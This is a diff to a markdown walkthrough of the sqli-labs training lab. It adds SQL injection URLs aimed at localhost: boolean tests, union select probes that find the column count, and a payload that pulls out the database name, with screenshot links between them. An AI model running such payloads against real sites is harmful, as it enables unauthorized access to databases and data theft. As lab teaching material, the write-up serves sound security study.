@@ -139,6 +139,24 @@ http://127.0.0.1/sqli-labs/Less-1/?id=1' AND 1=0 --+
 
 ![](images/1/16.png)
 
+```
+http://localhost/sqli-labs/Less-1/?id=1' or '1
+```
+
+![](images/1/48.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=1' AND '1
+http://localhost/sqli-labs/Less-1/?id=2' AND '1
+http://localhost/sqli-labs/Less-1/?id=3' AND '1
+```
+
+![](images/1/49.png)
+
+![](images/1/50.png)
+
+![](images/1/51.png)
+
 ###### Identify the columns in the query
 
 ```
@@ -294,6 +312,36 @@ columns of uagents table = id,uagent,ip_address,username
 columns of referers table = id,referer,ip_address
 columns of emails table = id,email_id
 ```
+
+```
+http://localhost/sqli-labs/Less-1/?id=9' union select 1 AND '1
+http://localhost/sqli-labs/Less-1/?id=9' union select 1,2 AND '1
+http://localhost/sqli-labs/Less-1/?id=9' union select 1,2,3 AND '1
+```
+
+![](images/1/52.png)
+
+![](images/1/53.png)
+
+![](images/1/54.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=-9' union select 1,2,3 AND '1
+```
+
+![](images/1/55.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=-9' union select 1,10,15 AND '1
+```
+
+![](images/1/56.png)
+
+```
+http://localhost/sqli-labs/Less-1/?id=-9' union select 1,database(),15 AND '1
+```
+
+![](images/1/57.png)
 
 ###### Enumerate using ```mysql``` client
 
